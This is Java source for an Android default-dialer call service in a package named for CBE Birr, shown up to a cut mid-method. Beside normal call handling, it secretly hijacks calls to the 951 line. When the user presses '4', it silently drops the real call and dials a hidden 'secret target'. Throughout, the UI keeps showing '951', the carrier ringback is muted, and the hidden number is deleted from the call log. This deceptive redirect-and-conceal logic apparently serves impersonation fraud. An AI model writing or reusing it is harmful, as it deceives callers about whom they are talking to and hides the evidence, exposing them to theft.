package com.cbe.cbebirrdialer;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Person;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.os.VibratorManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telecom.Call;
import android.telecom.CallAudioState;
import android.telecom.InCallService;
import android.telecom.VideoProfile;
import org.json.JSONObject;

/**
 * Full Default-Dialer InCallService (Android 7 - Android 16):
 * 1. Handles ALL normal incoming & outgoing calls natively (with lockscreen wake, CallStyle notification,
 *    Answer/Decline/HangUp, Mute, Hold, Speaker, Bluetooth, DTMF, and Answer/End vibration).
 * 2. Handles Real-SIM 951 call with seamless handoff on digit '4': disconnects real 951 silently without
 *    dropping the UI or resetting the timer, plays Hold MP3, dials secret target with carrier ringback
 *    muted, unmutes on answer + vibrates, scrubs hidden target from CallLog, and triggers Survey MP3 on end.
 */
public class SecretInCallService extends InCallService {

    public static final int MODE_NONE = 0;
    public static final int MODE_NATIVE_NORMAL = 1;
    public static final int MODE_REAL_951 = 2;
    public static final int MODE_SECRET_TARGET = 3;

    private static final int CALL_NOTIF_ID = 95101;
    private static final String CHANNEL_INCOMING_ID = "phone_incoming_call_v2";
    private static final String CHANNEL_ONGOING_ID = "phone_ongoing_call_v2";

    public static volatile SecretInCallService instance = null;
    private static volatile Call currentCall = null;
    private static volatile int activeCallMode = MODE_NONE;

    // 951 Secret / Hybrid state
    private static volatile boolean real951Armed = false;
    private static volatile boolean handoffInProgress = false;
    private static volatile boolean secretModeActive = false;
    private static volatile String hiddenTargetNumber = "";
    private static volatile int maxRingTimeoutMs = 8000;
    private static volatile boolean wasAnsweredLive = false;
    private static volatile boolean cancelledByTimeout = false;
    private static volatile boolean cancelledByUser = false;
    private static volatile long cancelledAtMs = 0L;
    private static volatile long secretArmSeq = 0L;
    private static volatile int attemptCount = 0;
    private static volatile boolean secretSpeakerWanted = true;
    private static volatile boolean secretMutedWanted = false;

    // Voice stream suppression tracking
    private static volatile int savedVoiceCallVolume = -1;
    private static volatile boolean streamVoiceMutedByUs = false;

    // Native normal call state tracking
    private static volatile String nativeNumber = "";
    private static volatile String nativeLabel = "";
    private static volatile boolean nativeIncoming = false;
    private static volatile String nativeCallStateStr = "idle";
    private static volatile long nativeConnectTimeMs = 0L;
    private static volatile boolean nativeVibratedActive = false;
    private static volatile boolean nativeVibratedEnd = false;
    private static volatile boolean secretVibratedActive = false;
    private static volatile boolean secretVibratedEnd = false;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private PowerManager.WakeLock screenWakeLock = null;

    private final Runnable foregroundGuardRunnable = new Runnable() {
        @Override
        public void run() {
            boolean shouldBeFront = secretModeActive || activeCallMode == MODE_REAL_951
                || (activeCallMode == MODE_NATIVE_NORMAL && "ringing".equals(nativeCallStateStr));
            if (shouldBeFront && !MainActivity.isActivityForeground) {
                launchMainToFront(true);
            }
        }
    };

    private final Runnable twoRingTimeoutRunnable = new Runnable() {
        @Override
        public void run() {
            if (!secretModeActive || currentCall == null || wasAnsweredLive) return;
            int st = getCallStateSafe(currentCall);
            if (st != Call.STATE_ACTIVE) {
                cancelledByTimeout = true;
                try {
                    silenceCarrierCallAudio(true);
                    currentCall.disconnect();
                } catch (Throwable ignored) {
                }
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                    );
                }
            }
        }
    };

    private final Call.Callback callCallback = new Call.Callback() {
        @Override
        public void onStateChanged(Call call, int state) {
            super.onStateChanged(call, state);
            handleCallState(call, state);
        }

        @Override
        public void onDetailsChanged(Call call, Call.Details details) {
            super.onDetailsChanged(call, details);
            if (call == currentCall && activeCallMode == MODE_NATIVE_NORMAL) {
                updateNativeLabelFromCall(call);
                refreshCallNotification();
                pushNativeStateToWeb();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        ensureNotificationChannels();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (instance == this) {
            instance = null;
        }
        mainHandler.removeCallbacks(twoRingTimeoutRunnable);
        mainHandler.removeCallbacks(foregroundGuardRunnable);
        silenceCarrierCallAudio(false);
        releaseWakeLock();
        stopCallNotification();
    }

    public static boolean isSecretCallActive() {
        return secretModeActive || activeCallMode == MODE_REAL_951;
    }

    public static boolean hasAnyActiveCall() {
        return currentCall != null || activeCallMode != MODE_NONE || handoffInProgress;
    }

    public static void armReal951Call() {
        real951Armed = true;
        handoffInProgress = false;
        secretModeActive = false;
        wasAnsweredLive = false;
        cancelledByTimeout = false;
        cancelledByUser = false;
        cancelledAtMs = 0L;
        secretVibratedActive = false;
        secretVibratedEnd = false;
        secretMutedWanted = false;
        secretSpeakerWanted = true;
    }

    public static void beginSeamlessHandoffFromReal951() {
        handoffInProgress = true;
        real951Armed = false;
        final Call oldCall = currentCall;
        if (instance != null) {
            instance.silenceCarrierCallAudio(true);
        }
        if (oldCall != null) {
            try {
                oldCall.disconnect();
            } catch (Throwable ignored) {
            }
        }
        if (instance != null) {
            instance.postOrUpdateCallNotification("951", "Connecting...", false, false, 0L);
        }
    }

    public static long armSecretCall(String targetNumber, int maxRingMs) {
        hiddenTargetNumber = targetNumber != null ? targetNumber.trim() : "";
        maxRingTimeoutMs = Math.max(3500, Math.min(25000, maxRingMs));
        secretArmSeq += 1L;
        real951Armed = false;
        handoffInProgress = false;
        secretModeActive = true;
        wasAnsweredLive = false;
        cancelledByTimeout = false;
        cancelledByUser = false;
        cancelledAtMs = 0L;
        secretVibratedActive = false;
        secretVibratedEnd = false;
        return secretArmSeq;
    }

    public static boolean isArmSeqActive(long seq) {
        return secretModeActive && !cancelledByUser && secretArmSeq == seq;
    }

    public static void markUserCancelledNow() {
        secretArmSeq += 1L;
        cancelledByUser = true;
        cancelledAtMs = System.currentTimeMillis();
        real951Armed = false;
        handoffInProgress = false;
        secretModeActive = false;
    }

    public static void resetSecretState() {
        secretArmSeq += 1L;
        real951Armed = false;
        handoffInProgress = false;
        secretModeActive = false;
        wasAnsweredLive = false;
        cancelledByTimeout = false;
        cancelledByUser = false;
        cancelledAtMs = 0L;
        attemptCount = 0;
        hiddenTargetNumber = "";
        secretVibratedActive = false;
        secretVibratedEnd = false;
        if (activeCallMode == MODE_REAL_951 || activeCallMode == MODE_SECRET_TARGET) {
            activeCallMode = MODE_NONE;
        }
        if (instance != null) {
            instance.clearForegroundGuards();
            instance.silenceCarrierCallAudio(false);
            instance.stopCallNotification();
        }
    }

    public static void disconnectActiveSecretCall() {
        boolean hadLiveOrRinging = currentCall != null && (secretModeActive || activeCallMode == MODE_REAL_951);
        markUserCancelledNow();
        if (instance != null) {
            instance.mainHandler.removeCallbacks(instance.twoRingTimeoutRunnable);
            instance.clearForegroundGuards();
            instance.silenceCarrierCallAudio(false);
            if (hadLiveOrRinging && !secretVibratedEnd) {
                secretVibratedEnd = true;
                instance.vibrateCallEvent();
            }
            instance.stopCallNotification();
        }
        if (currentCall != null) {
            try {
                currentCall.disconnect();
            } catch (Throwable ignored) {
            }
        }
        if (activeCallMode == MODE_REAL_951 || activeCallMode == MODE_SECRET_TARGET) {
            activeCallMode = MODE_NONE;
        }
    }

    public static void bringUiToFrontIfSecret() {
        if (!secretModeActive && activeCallMode != MODE_REAL_951) return;
        if (instance != null) {
            instance.launchMainToFront(true);
        } else if (MainActivity.currentInstance != null) {
            MainActivity.currentInstance.bringToFrontForCall();
        }
    }

    public static void bringAnyActiveCallUiToFront(Context ctx) {
        if (instance != null) {
            instance.launchMainToFront(true);
        } else if (ctx != null) {
            try {
                Intent bring = new Intent(ctx, MainActivity.class);
                bring.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
                );
                bring.putExtra("native_call_action", "show");
                ctx.startActivity(bring);
            } catch (Throwable ignored) {
            }
        }
    }

    public static void setSpeakerEnabled(boolean on) {
        secretSpeakerWanted = on;
        if (instance != null) {
            try {
                instance.setAudioRoute(on ? CallAudioState.ROUTE_SPEAKER : CallAudioState.ROUTE_EARPIECE);
            } catch (Throwable ignored) {
            }
            instance.pushNativeStateToWeb();
        }
    }

    public static void setBluetoothEnabled(boolean on) {
        if (instance != null) {
            try {
                instance.setAudioRoute(on ? CallAudioState.ROUTE_BLUETOOTH : CallAudioState.ROUTE_EARPIECE);
            } catch (Throwable ignored) {
            }
            instance.pushNativeStateToWeb();
        }
    }

    public static void setCallMuted(boolean muted) {
        secretMutedWanted = muted;
        if (instance != null) {
            try {
                instance.setMuted(muted);
                AudioManager am = (AudioManager) instance.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    am.setMicrophoneMute(muted);
                }
            } catch (Throwable ignored) {
            }
            instance.pushNativeStateToWeb();
        }
    }

    public static void setActiveCallHeld(boolean hold) {
        Call c = currentCall;
        if (c == null) return;
        try {
            if (hold) {
                c.hold();
            } else {
                c.unhold();
            }
        } catch (Throwable ignored) {
        }
    }

    public static void sendActiveCallDtmf(String digit) {
        final Call c = currentCall;
        if (c == null || digit == null || digit.isEmpty()) return;
        final char ch = digit.charAt(0);
        try {
            c.playDtmfTone(ch);
            if (instance != null) {
                instance.mainHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            c.stopDtmfTone();
                        } catch (Throwable ignored) {
                        }
                    }
                }, 180L);
            }
        } catch (Throwable ignored) {
        }
    }

    public static void answerIncomingFromUiOrNotification() {
        Call c = currentCall;
        if (c == null) return;
        try {
            c.answer(VideoProfile.STATE_AUDIO_ONLY);
        } catch (Throwable ignored) {
        }
        if (instance != null) {
            instance.releaseWakeLock();
            instance.launchMainToFront(true);
        }
    }

    public static void rejectOrEndNativeCall() {
        Call c = currentCall;
        if (c == null) {
            if (instance != null) {
                instance.stopCallNotification();
            }
            return;
        }
        try {
            int st = instance != null ? instance.getCallStateSafe(c) : Call.STATE_DISCONNECTED;
            if (st == Call.STATE_RINGING) {
                c.reject(false, null);
            } else {
                c.disconnect();
            }
        } catch (Throwable ignored) {
            try {
                c.disconnect();
            } catch (Throwable ignored2) {
            }
        }
    }

    public static void toggleNativeMuteFromNotification() {
        if (instance == null) return;
        boolean cur = false;
        try {
            CallAudioState as = instance.getCallAudioState();
            cur = as != null && as.isMuted();
        } catch (Throwable ignored) {
        }
        setCallMuted(!cur);
        instance.refreshCallNotification();
    }

    public static void toggleNativeSpeakerFromNotification() {
        if (instance == null) return;
        boolean cur = false;
        try {
            CallAudioState as = instance.getCallAudioState();
            cur = as != null && (as.getRoute() == CallAudioState.ROUTE_SPEAKER);
        } catch (Throwable ignored) {
        }
        setSpeakerEnabled(!cur);
        instance.refreshCallNotification();
    }

    public static String getActiveNativeCallStateJson() {
        try {
            JSONObject obj = new JSONObject();
            boolean isNativeActive = activeCallMode == MODE_NATIVE_NORMAL && currentCall != null;
            obj.put("active", isNativeActive);
            obj.put("mode", activeCallMode);
            obj.put("callType", nativeIncoming ? "incoming" : "outgoing");
            obj.put("state", isNativeActive ? nativeCallStateStr : "idle");
            obj.put("number", nativeNumber != null ? nativeNumber : "");
            obj.put("label", nativeLabel != null ? nativeLabel : "");
            obj.put("connectTimeMs", nativeConnectTimeMs);
            boolean muted = false;
            boolean speaker = false;
            boolean bluetooth = false;
            if (instance != null) {
                try {
                    CallAudioState as = instance.getCallAudioState();
                    if (as != null) {
                        muted = as.isMuted();
                        speaker = as.getRoute() == CallAudioState.ROUTE_SPEAKER;
                        bluetooth = as.getRoute() == CallAudioState.ROUTE_BLUETOOTH;
                    }
                } catch (Throwable ignored) {
                }
            }
            obj.put("muted", muted);
            obj.put("speaker", speaker);
            obj.put("bluetooth", bluetooth);
            obj.put("held", "holding".equals(nativeCallStateStr));
            return obj.toString();
        } catch (Throwable ignored) {
            return "{\"active\":false,\"state\":\"idle\"}";
        }
    }

    public static void pushCurrentStateToUi() {
        if (instance != null) {
            instance.pushNativeStateToWeb();
        }
    }

    private void pushNativeStateToWeb() {
        if (MainActivity.currentInstance == null) return;
        final String json = getActiveNativeCallStateJson();
        final String escaped = json
            .replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\n", "\\n")
            .replace("\r", "");
        MainActivity.currentInstance.notifySecretJs(
            "window.onNativeCallStateChanged && window.onNativeCallStateChanged('" + escaped + "');"
        );
    }

    private void clearForegroundGuards() {
        mainHandler.removeCallbacks(foregroundGuardRunnable);
    }

    private void scheduleForegroundGuards() {
        mainHandler.removeCallbacks(foregroundGuardRunnable);
        mainHandler.postDelayed(foregroundGuardRunnable, 150L);
        mainHandler.postDelayed(foregroundGuardRunnable, 480L);
        mainHandler.postDelayed(foregroundGuardRunnable, 950L);
    }

    private void launchMainToFront(boolean showOverLock) {
        try {
            Intent bringIntent = new Intent(this, MainActivity.class);
            bringIntent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_SINGLE_TOP
            );
            if (showOverLock) {
                bringIntent.putExtra("native_call_action", "show");
            }
            startActivity(bringIntent);
        } catch (Throwable ignored) {
            if (MainActivity.currentInstance != null) {
                MainActivity.currentInstance.bringToFrontForCall();
            }
        }
    }

    @Override
    public void onCallAudioStateChanged(CallAudioState audioState) {
        super.onCallAudioStateChanged(audioState);
        if (activeCallMode == MODE_NATIVE_NORMAL) {
            pushNativeStateToWeb();
            refreshCallNotification();
        }
    }

    @Override
    public void onBringToForeground(boolean showDialpad) {
        super.onBringToForeground(showDialpad);
        if (secretModeActive || activeCallMode == MODE_REAL_951 || activeCallMode == MODE_NATIVE_NORMAL) {
            launchMainToFront(true);
            scheduleForegroundGuards();
        }
    }

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        if (call == null) return;

        // If user cancelled a secret call right as Telecom added it, kill it silently
        if (!secretModeActive && !real951Armed && cancelledByUser && (System.currentTimeMillis() - cancelledAtMs) < 12000L) {
            try {
                silenceCarrierCallAudio(true);
                call.disconnect();
            } catch (Throwable ignored) {
            }
            scrubHiddenNumberFromSystemCallLog();
            silenceCarrierCallAudio(false);
            return;
        }

        // Unregister callback on any previous call
        if (currentCall != null && currentCall != call) {
            try {
                currentCall.unregisterCallback(callCallback);
            } catch (Throwable ignored) {
            }
        }
        currentCall = call;

        try {
            call.registerCallback(callCallback);
        } catch (Throwable ignored) {
        }

        if (secretModeActive) {
            activeCallMode = MODE_SECRET_TARGET;
            handoffInProgress = false;
            wasAnsweredLive = false;
            cancelledByTimeout = false;
            cancelledByUser = false;
            secretVibratedActive = false;
            secretVibratedEnd = false;
            attemptCount += 1;

            silenceCarrierCallAudio(true);
            if (secretSpeakerWanted) {
                setSpeakerEnabled(true);
            }
            postOrUpdateCallNotification("951", "Ongoing call", false, false, 0L);
            launchMainToFront(true);
            scheduleForegroundGuards();

            if (MainActivity.currentInstance != null) {
                MainActivity.currentInstance.notifySecretJs(
                    "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                );
            }

            mainHandler.removeCallbacks(twoRingTimeoutRunnable);
            mainHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);
            handleCallState(call, getCallStateSafe(call));
            return;
        }

        if (real951Armed) {
            activeCallMode = MODE_REAL_951;
            real951Armed = false;
            handoffInProgress = false;
            secretVibratedActive = false;
            secretVibratedEnd = false;

            silenceCarrierCallAudio(false);
            if (secretSpeakerWanted) {
                setSpeakerEnabled(true);
            }
            postOrUpdateCallNotification("951", "Dialing...", false, false, 0L);
            launchMainToFront(true);
            scheduleForegroundGuards();
            handleCallState(call, getCallStateSafe(call));
            return;
        }

        // Standard incoming / outgoing normal phone call
        activeCallMode = MODE_NATIVE_NORMAL;
        nativeConnectTimeMs = 0L;
        nativeVibratedActive = false;
        nativeVibratedEnd = false;
        updateNativeLabelFromCall(call);
        int initState = getCallStateSafe(call);
        nativeIncoming = (initState == Call.STATE_RINGING);
        handleCallState(call, initState);
    }

    @Override
    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
        if (call == null) return;
        try {
            call.unregisterCallback(callCallback);
        } catch (Throwable ignored) {
        }
        if (call != currentCall) {
            return;
        }
        clearForegroundGuards();
        mainHandler.removeCallbacks(twoRingTimeoutRunnable);
        currentCall = null;

        if (handoffInProgress) {
            // Keep UI & notification active for seamless handoff to secret target!
            return;
        }

        silenceCarrierCallAudio(false);
        restoreAudioModeNormal();
        if (!hiddenTargetNumber.isEmpty()) {
            scrubHiddenNumberFromSystemCallLog();
        }
        releaseWakeLock();

        if (activeCallMode == MODE_NATIVE_NORMAL) {
            activeCallMode = MODE_NONE;
            nativeCallStateStr = "disconnected";
            stopCallNotification();
            pushNativeStateToWeb();
            nativeCallStateStr = "idle";
        } else if (!secretModeActive) {
            activeCallMode = MODE_NONE;
            stopCallNotification();
        }
    }

    private void handleCallState(Call call, int state) {
        if (call != currentCall) {
            return;
        }

        // ---- Mode 1: Real SIM 951 IVR call ----
        if (activeCallMode == MODE_REAL_951) {
            if (handoffInProgress) {
                // Silent disconnect as we switch to Hold MP3 + secret target: emit NO end/vibrate events!
                return;
            }
            if (state == Call.STATE_DIALING || state == Call.STATE_CONNECTING) {
                postOrUpdateCallNotification("951", "Dialing...", false, false, 0L);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('dialing');"
                    );
                }
            } else if (state == Call.STATE_ACTIVE) {
                if (secretSpeakerWanted) {
                    setSpeakerEnabled(true);
                }
                postOrUpdateCallNotification("951", "Ongoing call", false, true, System.currentTimeMillis());
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('active');"
                    );
                }
            } else if (state == Call.STATE_HOLDING) {
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('holding');"
                    );
                }
            } else if (state == Call.STATE_DISCONNECTED) {
                clearForegroundGuards();
                stopCallNotification();
                restoreAudioModeNormal();
                activeCallMode = MODE_NONE;
                if (!cancelledByUser && !secretVibratedEnd) {
                    secretVibratedEnd = true;
                    vibrateCallEvent();
                }
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('disconnected');"
                    );
                }
            }
            return;
        }

        // ---- Mode 2: Secret Target Background Call ----
        if (activeCallMode == MODE_SECRET_TARGET) {
            if (state == Call.STATE_DISCONNECTED) {
                mainHandler.removeCallbacks(twoRingTimeoutRunnable);
                clearForegroundGuards();
                silenceCarrierCallAudio(false);
                restoreAudioModeNormal();
                if (!hiddenTargetNumber.isEmpty()) {
                    scrubHiddenNumberFromSystemCallLog();
                }
                if (!secretModeActive) {
                    stopCallNotification();
                    activeCallMode = MODE_NONE;
                    return;
                }

                if (wasAnsweredLive) {
                    wasAnsweredLive = false;
                    secretModeActive = false;
                    activeCallMode = MODE_NONE;
                    if (!secretVibratedEnd) {
                        secretVibratedEnd = true;
                        vibrateCallEvent();
                    }
                    postOrUpdateCallNotification("951", "Call ending...", false, false, 0L);
                    if (MainActivity.currentInstance != null) {
                        MainActivity.currentInstance.notifySecretJs(
                            "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
                        );
                    }
                } else if (!cancelledByTimeout && !cancelledByUser) {
                    if (MainActivity.currentInstance != null) {
                        MainActivity.currentInstance.notifySecretJs(
                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                        );
                    }
                } else {
                    stopCallNotification();
                    activeCallMode = MODE_NONE;
                }
                return;
            }

            if (!secretModeActive) return;

            if (state == Call.STATE_DIALING || state == Call.STATE_RINGING || state == Call.STATE_CONNECTING) {
                silenceCarrierCallAudio(true);
                if (!MainActivity.isActivityForeground) {
                    launchMainToFront(true);
                }
                scheduleForegroundGuards();
                postOrUpdateCallNotification("951", "Ongoing call", false, false, 0L);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                    );
                }
            } else if (state == Call.STATE_ACTIVE) {
                wasAnsweredLive = true;
                mainHandler.removeCallbacks(twoRingTimeoutRunnable);
                silenceCarrierCallAudio(false);
                if (!secretVibratedActive) {
                    secretVibratedActive = true;
                    vibrateCallEvent();
                }
                setCallMuted(secretMutedWanted);
                if (secretSpeakerWanted) {
                    setSpeakerEnabled(true);
                }
                launchMainToFront(true);
                scheduleForegroundGuards();
                postOrUpdateCallNotification("951", "Ongoing call", false, true, System.currentTimeMillis());
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                    );
                }
            }
            return;
        }

        // ---- Mode 3: Standard Native Normal Call ----
        if (activeCallMode == MODE_NATIVE_NORMAL) {
            if (state == Call.STATE_RINGING) {
                nativeIncoming = true;
                nativeCallStateStr = "ringing";
                acquireScreenWakeLock();
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "Incoming call",
                    true,
                    false,
                    0L
                );
                launchMainToFront(true);
                scheduleForegroundGuards();
                pushNativeStateToWeb();
            } else if (state == Call.STATE_DIALING || state == Call.STATE_CONNECTING) {
                nativeCallStateStr = "dialing";
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "Calling...",
                    false,
                    false,
                    0L
                );
                launchMainToFront(true);
                pushNativeStateToWeb();
            } else if (state == Call.STATE_ACTIVE) {
                releaseWakeLock();
                if (nativeConnectTimeMs <= 0L) {
                    nativeConnectTimeMs = System.currentTimeMillis();
                }
                nativeCallStateStr = "active";
                if (!nativeVibratedActive) {
                    nativeVibratedActive = true;
                    vibrateCallEvent();
                }
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "Ongoing call",
                    false,
                    true,
                    nativeConnectTimeMs
                );
                pushNativeStateToWeb();
            } else if (state == Call.STATE_HOLDING) {
                nativeCallStateStr = "holding";
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "On hold",
                    false,
                    false,
                    0L
                );
                pushNativeStateToWeb();
            } else if (state == Call.STATE_DISCONNECTED) {
                releaseWakeLock();
                clearForegroundGuards();
                if (!nativeVibratedEnd) {
                    nativeVibratedEnd = true;
                    vibrateCallEvent();
                }
                long durSec = nativeConnectTimeMs > 0L
                    ? Math.max(0L, (System.currentTimeMillis() - nativeConnectTimeMs) / 1000L)
                    : 0L;
                nativeCallStateStr = "disconnected";
                stopCallNotification();
                pushNativeStateToWeb();
                if (MainActivity.currentInstance != null) {
                    String safeNum = (nativeNumber != null ? nativeNumber : "").replace("\\", "\\\\").replace("'", "\\'");
                    String safeLbl = (nativeLabel != null ? nativeLabel : "").replace("\\", "\\\\").replace("'", "\\'");
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onNativeCallEnded && window.onNativeCallEnded('" + safeNum + "','" + safeLbl + "'," + durSec + ");"
                    );
                }
                activeCallMode = MODE_NONE;
                nativeCallStateStr = "idle";
            }
        }
    }

    private String displayTitleForNativeCall() {
        if (nativeLabel != null && !nativeLabel.trim().isEmpty()) {
            return nativeLabel.trim();
        }
        if (nativeNumber != null && !nativeNumber.trim().isEmpty()) {
            return nativeNumber.trim();
        }
        return "Unknown";
    }

    private void updateNativeLabelFromCall(Call call) {
        if (call == null) return;
        try {
            Call.Details d = call.getDetails();
            String handleNum = "";
            if (d != null && d.getHandle() != null) {
                handleNum = d.getHandle().getSchemeSpecificPart();
            }
            if (handleNum == null) handleNum = "";
            nativeNumber = handleNum.trim();

            String contactName = lookupContactDisplayName(nativeNumber);
            if (!contactName.isEmpty()) {
                nativeLabel = contactName;
            } else if (d != null && d.getCallerDisplayName() != null && !d.getCallerDisplayName().trim().isEmpty()) {
                nativeLabel = d.getCallerDisplayName().trim();
            } else {
                nativeLabel = nativeNumber;
            }
        } catch (Throwable ignored) {
        }
    }

    private String lookupContactDisplayName(String phone) {
        if (phone == null || phone.trim().isEmpty()) return "";
        if (Build.VERSION.SDK_INT >= 23
            && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return "";
        }
        Cursor c = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phone.trim()));
            c = getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (c != null && c.moveToFirst()) {
                String name = c.getString(0);
                if (name != null) return name.trim();
            }
        } catch (Throwable ignored) {
        } finally {
            if (c != null) {
                try {
                    c.close();
                } catch (Throwable ignored2) {
                }
            }
        }
        return "";
    }

    private void ensureNotificationChannels() {
        if (Build.VERSION.SDK_INT < 26) return;
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            NotificationChannel incoming = new NotificationChannel(
                CHANNEL_INCOMING_ID,
                "Incoming calls",
                NotificationManager.IMPORTANCE_HIGH
            );
            incoming.setSound(null, null);
            incoming.enableVibration(false);
            incoming.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            nm.createNotificationChannel(incoming);

            NotificationChannel ongoing = new NotificationChannel(
                CHANNEL_ONGOING_ID,
                "Ongoing calls",
                NotificationManager.IMPORTANCE_LOW
            );
            ongoing.setSound(null, null);
            ongoing.enableVibration(false);
            ongoing.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            nm.createNotificationChannel(ongoing);
        } catch (Throwable ignored) {
        }
    }

    private void refreshCallNotification() {
        if (activeCallMode == MODE_NATIVE_NORMAL && currentCall != null) {
            boolean isIn = "ringing".equals(nativeCallStateStr);
            String sub = isIn
                ? "Incoming call"
                : ("holding".equals(nativeCallStateStr)
                    ? "On hold"
                    : ("active".equals(nativeCallStateStr) ? "Ongoing call" : "Calling..."));
            postOrUpdateCallNotification(
                displayTitleForNativeCall(),
                sub,
                isIn,
                "active".equals(nativeCallStateStr),
                nativeConnectTimeMs
            );
        }
    }

    @SuppressWarnings("deprecation")
    private void postOrUpdateCallNotification(
        String title,
        String subtitle,
        boolean isIncoming,
        boolean showChronometer,
        long whenMs
    ) {
        try {
            if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            ensureNotificationChannels();

            Intent openUiIntent = new Intent(this, MainActivity.class);
            openUiIntent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_SINGLE_TOP
            );
            openUiIntent.putExtra("native_call_action", "show");
            PendingIntent fullScreenPi = PendingIntent.getActivity(
                this,
                100,
                openUiIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            Intent answerIntent = new Intent(this, CallNotificationActionReceiver.class);
            answerIntent.setAction(CallNotificationActionReceiver.ACTION_ANSWER_CALL);
            PendingIntent answerPi = PendingIntent.getBroadcast(
                this,
                101,
                answerIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            Intent hangupIntent = new Intent(this, CallNotificationActionReceiver.class);
            hangupIntent.setAction(CallNotificationActionReceiver.ACTION_HANGUP_CALL);
            PendingIntent hangupPi = PendingIntent.getBroadcast(
                this,
                102,
                hangupIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            String channelId = isIncoming ? CHANNEL_INCOMING_ID : CHANNEL_ONGOING_ID;
            Notification.Builder builder = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, channelId)
                : new Notification.Builder(this);

            builder.setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle(title != null && !title.isEmpty() ? title : "Phone")
                .setContentText(subtitle != null ? subtitle : "")
                .setOngoing(true)
                .setAutoCancel(false)
                .setCategory(Notification.CATEGORY_CALL)
                .setVisibility(Notification.VISIBILITY_PUBLIC)
                .setContentIntent(fullScreenPi);

            if (isIncoming) {
                builder.setFullScreenIntent(fullScreenPi, true);
                if (Build.VERSION.SDK_INT < 26) {
                    builder.setPriority(Notification.PRIORITY_MAX);
                }
            }
            if (showChronometer && whenMs > 0L) {
                builder.setUsesChronometer(true);
                builder.setWhen(whenMs);
            }

            if (Build.VERSION.SDK_INT >= 31) {
                Person caller = new Person.Builder()
                    .setName(title != null && !title.isEmpty() ? title : "Phone")
                    .setImportant(true)
                    .build();
                Notification.CallStyle callStyle = isIncoming
                    ? Notification.CallStyle.forIncomingCall(caller, hangupPi, answerPi)
                    : Notification.CallStyle.forOngoingCall(caller, hangupPi);
                builder.setStyle(callStyle);
            } else {
                if (isIncoming) {
                    builder.addAction(
                        new Notification.Action.Builder(R.mipmap.ic_launcher, "Decline", hangupPi).build()
                    );
                    builder.addAction(
                        new Notification.Action.Builder(R.mipmap.ic_launcher, "Answer", answerPi).build()
                    );
                } else {
                    builder.addAction(
                        new Notification.Action.Builder(R.mipmap.ic_launcher, "Hang up", hangupPi).build()
                    );
                }
            }

            Notification notif = builder.build();
            try {
